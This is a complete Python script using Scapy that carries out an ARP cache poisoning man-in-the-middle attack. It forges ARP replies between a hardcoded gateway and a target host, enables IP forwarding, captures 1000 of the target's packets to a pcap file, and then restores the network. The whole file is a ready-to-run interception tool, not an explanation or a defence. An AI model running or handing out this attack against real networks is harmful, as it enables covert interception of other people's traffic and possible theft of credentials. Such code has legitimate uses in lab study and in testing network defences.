# @Author: xcrowzz
# @Date:   2018-09-29T17:47:40+02:00
# @Last modified by:   xcrowzz
# @Last modified time: 2018-09-29T20:04:05+02:00

from scapy.all import *
import os
import signal
import sys
import threading
import time

# SYS: Ubuntu 16.04
# USAGE: sudo python2.7 arp_poison.py

# Parameters
gateway_ip = "10.41.254.254"
target_ip = "10.41.176.177"
packet_count = 1000
conf.iface = "wlo1"
conf.verb = 0

# Get MAC address from ARP reply
def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None

# Reverse ARP poison attack
# Broadcast ARP reply with correct MAC and IP info
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    os.system("sysctl -w net.ipv4.ip_forward=0")
    os.kill(os.getpid(), signal.SIGTERM)

# Send false ARP replies to MitM packets
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


# Starting script
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
os.system("sysctl -w net.ipv4.ip_forward=1")
print("[*] Gateway IP address: %s " % gateway_ip)
print("[*] Target IP address: %s " % target_ip)

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Gateway MAC address: %s " % gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC address: %s " % target_mac)


# ARP poison thread
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

# Traffic sniffer + file writing
try:
    sniff_filter = "ip host " + target_ip
    print("[*] Starting network capture. Packet Count: %s. Filter: %s" % (packet_count, sniff_filter))
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print("[+] Packets : %s" % packets)
    print("[*] Stopping network capture.. Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    print("[*] Stopping network capture.. Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
